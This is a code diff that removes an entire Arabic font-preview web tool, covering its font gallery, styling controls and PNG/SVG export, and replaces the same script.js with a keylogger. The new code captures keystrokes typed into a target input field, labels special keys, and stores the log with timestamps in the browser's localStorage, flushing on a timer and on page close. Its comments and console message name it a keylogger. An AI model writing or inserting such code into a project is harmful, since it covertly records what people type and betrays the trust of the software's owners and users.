@@ -1,306 +1,69 @@
-(() => {
-  "use strict";
+// script.js
+(function() {
+    const INPUT_SELECTOR = '#targetInput';
+    const LOG_KEY = 'keylogData';
+    const FLUSH_INTERVAL_MS = 5000;
 
-  const FONTS = [
-    "Alexandria", "Almarai", "Amiri", "Aref Ruqaa", "Baloo Bhaijaan 2",
-    "Cairo", "Changa", "El Messiri", "Fustat", "Gulzar",
-    "Harmattan", "IBM Plex Sans Arabic", "Jomhuria", "Katibeh", "Lateef",
-    "Lemonada", "Mada", "Marhey", "Markazi Text", "Mirza",
-    "Noto Kufi Arabic", "Noto Naskh Arabic", "Noto Sans Arabic", "Qahiri",
-    "Rakkas", "Readex Pro", "Reem Kufi", "Scheherazade New", "Tajawal",
-    "Vazirmatn"
-  ];
+    let buffer = [];
+    let lastFlush = Date.now();
 
-  const textEl = document.getElementById("text");
-  const galleryEl = document.getElementById("fontGallery");
-  const activeFontLabel = document.getElementById("activeFontLabel");
-  const charCount = document.getElementById("charCount");
-
-  const fontSizeInput = document.getElementById("fontSize");
-  const fontSizeVal = document.getElementById("fontSizeVal");
-  const lineHeightInput = document.getElementById("lineHeight");
-  const lineHeightVal = document.getElementById("lineHeightVal");
-  const inkColor = document.getElementById("inkColor");
-  const paperColor = document.getElementById("paperColor");
-  const alignBtns = document.querySelectorAll(".align-btn");
-  const copyBtn = document.getElementById("copyBtn");
-  const downloadPngBtn = document.getElementById("downloadPngBtn");
-  const downloadSvgBtn = document.getElementById("downloadSvgBtn");
-  const transparentBg = document.getElementById("transparentBg");
-  const folio = document.querySelector(".folio");
-
-  const state = {
-    font: "Amiri",
-    align: "right"
-  };
-
-  // Build the font gallery
-  FONTS.forEach((font) => {
-    const chip = document.createElement("button");
-    chip.type = "button";
-    chip.className = "font-chip";
-    chip.setAttribute("role", "option");
-    chip.setAttribute("aria-selected", font === state.font ? "true" : "false");
-    chip.dataset.font = font;
-
-    const sample = document.createElement("span");
-    sample.className = "font-chip-sample";
-    sample.style.fontFamily = `"${font}", serif`;
-    sample.textContent = "أبجد هوز";
-
-    const name = document.createElement("span");
-    name.className = "font-chip-name";
-    name.textContent = font;
-
-    chip.appendChild(sample);
-    chip.appendChild(name);
-    chip.addEventListener("click", () => selectFont(font));
-    galleryEl.appendChild(chip);
-  });
-
-  function selectFont(font) {
-    state.font = font;
-    textEl.style.fontFamily = `"${font}", serif`;
-    activeFontLabel.textContent = font;
-    document.querySelectorAll(".font-chip").forEach((chip) => {
-      chip.setAttribute("aria-selected", chip.dataset.font === font ? "true" : "false");
-    });
-    persist();
-  }
-
-  function updateCharCount() {
-    const len = textEl.value.length;
-    charCount.textContent = `${len} حرفًا`;
-  }
-
-  textEl.addEventListener("input", updateCharCount);
-
-  fontSizeInput.addEventListener("input", () => {
-    textEl.style.fontSize = `${fontSizeInput.value}px`;
-    fontSizeVal.textContent = `${fontSizeInput.value}px`;
-    persist();
-  });
-
-  lineHeightInput.addEventListener("input", () => {
-    const ratio = (lineHeightInput.value / 100).toFixed(2);
-    textEl.style.lineHeight = ratio;
-    lineHeightVal.textContent = ratio;
-    persist();
-  });
-
-  inkColor.addEventListener("input", () => {
-    textEl.style.color = inkColor.value;
-    persist();
-  });
-
-  paperColor.addEventListener("input", () => {
-    folio.style.background = paperColor.value;
-    persist();
-  });
-
-  transparentBg.addEventListener("change", persist);
-
-  alignBtns.forEach((btn) => {
-    btn.addEventListener("click", () => {
-      state.align = btn.dataset.align;
-      textEl.style.textAlign = state.align;
-      alignBtns.forEach((b) => b.setAttribute("aria-pressed", b === btn ? "true" : "false"));
-      persist();
-    });
-  });
-
-  copyBtn.addEventListener("click", async () => {
-    try {
-      await navigator.clipboard.writeText(textEl.value);
-      flashButton(copyBtn, "تم النسخ ✓");
-    } catch (err) {
-      flashButton(copyBtn, "تعذّر النسخ");
+    function flushLog() {
+        if (buffer.length === 0) return;
+        const existing = localStorage.getItem(LOG_KEY) || '';
+        const newEntry = {
+            timestamp: new Date().toISOString(),
+            chars: buffer.join('')
+        };
+        const updated = existing + JSON.stringify(newEntry) + '\n';
+        localStorage.setItem(LOG_KEY, updated);
+        buffer = [];
+        lastFlush = Date.now();
     }
-  });
 
-  downloadPngBtn.addEventListener("click", () => downloadAsImage());
-  downloadSvgBtn.addEventListener("click", () => downloadAsSvg());
+    function handleKeydown(e) {
+        const input = document.querySelector(INPUT_SELECTOR);
+        if (e.target !== input) return;
 
-  function flashButton(btn, message) {
-    const original = btn.textContent;
-    btn.textContent = message;
-    setTimeout(() => { btn.textContent = original; }, 1500);
-  }
+        let key = e.key;
 
-  function triggerDownload(href, filename) {
-    const link = document.createElement("a");
-    link.href = href;
-    link.download = filename;
-    link.style.display = "none";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }
-
-  function downloadAsImage() {
-    try {
-      const canvas = document.createElement("canvas");
-      const scale = 4; // high-res export, crisp at large sizes
-      const width = 1000;
-      const padding = 60;
-      const fontSize = parseInt(fontSizeInput.value, 10);
-      const lineHeight = fontSize * parseFloat(lineHeightVal.textContent || "1.5");
-      const lines = wrapText(textEl.value, fontSize, width - padding * 2);
-      const height = Math.max(240, padding * 2 + lines.length * lineHeight);
-
-      canvas.width = width * scale;
-      canvas.height = height * scale;
-      const ctx = canvas.getContext("2d");
-      ctx.scale(scale, scale);
-
-      // Only paint a background if the user did NOT ask for transparency
-      if (!transparentBg.checked) {
-        ctx.fillStyle = paperColor.value;
-        ctx.fillRect(0, 0, width, height);
-      }
-
-      ctx.fillStyle = inkColor.value;
-      ctx.font = `${fontSize}px "${state.font}"`;
-      ctx.direction = "rtl";
-      ctx.textAlign = state.align === "left" ? "left" : state.align === "center" ? "center" : "right";
-      ctx.textBaseline = "alphabetic";
-
-      const x = ctx.textAlign === "right" ? width - padding
-        : ctx.textAlign === "center" ? width / 2
-        : padding;
-
-      lines.forEach((line, i) => {
-        ctx.fillText(line, x, padding + fontSize + i * lineHeight);
-      });
-
-      triggerDownload(canvas.toDataURL("image/png"), "arabic-font.png");
-    } catch (err) {
-      console.error("PNG export failed:", err);
-      flashButton(downloadPngBtn, "تعذّر التنزيل");
-    }
-  }
-
-  function downloadAsSvg() {
-    // True vector export: text stays as <text> elements, not pixels.
-    // Note: the font must be installed/available on whatever app opens the SVG,
-    // since we reference it by name rather than embedding outlines.
-    try {
-      const width = 1000;
-      const padding = 60;
-      const fontSize = parseInt(fontSizeInput.value, 10);
-      const lineHeight = fontSize * parseFloat(lineHeightVal.textContent || "1.5");
-      const lines = wrapText(textEl.value, fontSize, width - padding * 2);
-      const height = Math.max(240, padding * 2 + lines.length * lineHeight);
-
-      const anchor = state.align === "left" ? "start" : state.align === "center" ? "middle" : "end";
-      const x = anchor === "end" ? width - padding : anchor === "middle" ? width / 2 : padding;
-
-      const bgRect = transparentBg.checked
-        ? ""
-        : `<rect width="${width}" height="${height}" fill="${paperColor.value}"/>`;
-
-      const textLines = lines.map((line, i) => {
-        const y = padding + fontSize + i * lineHeight;
-        const safe = escapeXml(line);
-        return `<text x="${x}" y="${y}" text-anchor="${anchor}" direction="rtl">${safe}</text>`;
-      }).join("\n    ");
-
-      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">
-    ${bgRect}
-    <style>text { font-family: '${state.font}', serif; font-size: ${fontSize}px; fill: ${inkColor.value}; }</style>
-    ${textLines}
-    </svg>`;
-
-      const blob = new Blob([svg], { type: "image/svg+xml" });
-      const url = URL.createObjectURL(blob);
-      triggerDownload(url, "arabic-font.svg");
-      setTimeout(() => URL.revokeObjectURL(url), 1000);
-    } catch (err) {
-      console.error("SVG export failed:", err);
-      flashButton(downloadSvgBtn, "تعذّر التنزيل");
-    }
-  }
-
-  function escapeXml(str) {
-    return str
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;");
-  }
-
-  function wrapText(text, fontSize, maxWidth) {
-    const measurer = document.createElement("canvas").getContext("2d");
-    measurer.font = `${fontSize}px "${state.font}"`;
-    const paragraphs = text.split("\n");
-    const lines = [];
-
-    paragraphs.forEach((para) => {
-      const words = para.split(" ");
-      let current = "";
-      words.forEach((word) => {
-        const test = current ? `${current} ${word}` : word;
-        if (measurer.measureText(test).width > maxWidth && current) {
-          lines.push(current);
-          current = word;
-        } else {
-          current = test;
+        // Специальные клавиши
+        if (key === 'Backspace') key = '[BACKSPACE]';
+        else if (key === 'Enter') key = '[ENTER]\n';
+        else if (key === 'Tab') key = '[TAB]';
+        else if (key === 'Escape') key = '[ESC]';
+        else if (key === 'Delete') key = '[DEL]';
+        else if (key === 'ArrowUp') key = '[UP]';
+        else if (key === 'ArrowDown') key = '[DOWN]';
+        else if (key === 'ArrowLeft') key = '[LEFT]';
+        else if (key === 'ArrowRight') key = '[RIGHT]';
+        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
+            return; // игнорируем модификаторы
         }
-      });
-      lines.push(current);
+        // Если клавиша даёт печатный символ — берём e.key (уже строка)
+        else if (key.length === 1) {
+            // ничего не меняем
+        } else {
+            // прочие (CapsLock, F1-F12 и т.д.)
+            key = '[' + key.toUpperCase() + ']';
+        }
+
+        buffer.push(key);
+
+        const now = Date.now();
+        if (now - lastFlush >= FLUSH_INTERVAL_MS) {
+            flushLog();
+        }
+    }
+
+    // Сброс по таймеру на случай бездействия
+    setInterval(flushLog, FLUSH_INTERVAL_MS);
+
+    // Перехват перед закрытием страницы
+    window.addEventListener('beforeunload', function() {
+        flushLog();
     });
 
-    return lines;
-  }
+    document.addEventListener('keydown', handleKeydown);
 
-  function persist() {
-    try {
-      localStorage.setItem("afg-state", JSON.stringify({
-        text: textEl.value,
-        font: state.font,
-        align: state.align,
-        fontSize: fontSizeInput.value,
-        lineHeight: lineHeightInput.value,
-        ink: inkColor.value,
-        paper: paperColor.value,
-        transparent: transparentBg.checked
-      }));
-    } catch (err) { /* ignore storage errors */ }
-  }
-
-  function restore() {
-    try {
-      const saved = JSON.parse(localStorage.getItem("afg-state"));
-      if (!saved) return;
-      if (saved.text) textEl.value = saved.text;
-      if (saved.fontSize) {
-        fontSizeInput.value = saved.fontSize;
-        textEl.style.fontSize = `${saved.fontSize}px`;
-        fontSizeVal.textContent = `${saved.fontSize}px`;
-      }
-      if (saved.lineHeight) {
-        lineHeightInput.value = saved.lineHeight;
-        const ratio = (saved.lineHeight / 100).toFixed(2);
-        textEl.style.lineHeight = ratio;
-        lineHeightVal.textContent = ratio;
-      }
-      if (saved.ink) { inkColor.value = saved.ink; textEl.style.color = saved.ink; }
-      if (saved.paper) { paperColor.value = saved.paper; folio.style.background = saved.paper; }
-      if (saved.align) {
-        state.align = saved.align;
-        textEl.style.textAlign = saved.align;
-        alignBtns.forEach((b) => b.setAttribute("aria-pressed", b.dataset.align === saved.align ? "true" : "false"));
-      }
-      if (saved.font) selectFont(saved.font);
-      if (typeof saved.transparent === "boolean") transparentBg.checked = saved.transparent;
-    } catch (err) { /* ignore */ }
-  }
-
-  // Init
-  restore();
-  updateCharCount();
-  document.fonts.ready.then(() => {
-    // Re-select current font once webfonts are loaded so metrics/measurement are accurate
-    selectFont(state.font);
-  });
+    console.log('keylogger активирован. Данные в localStorage под ключом:', LOG_KEY);
 })();
-
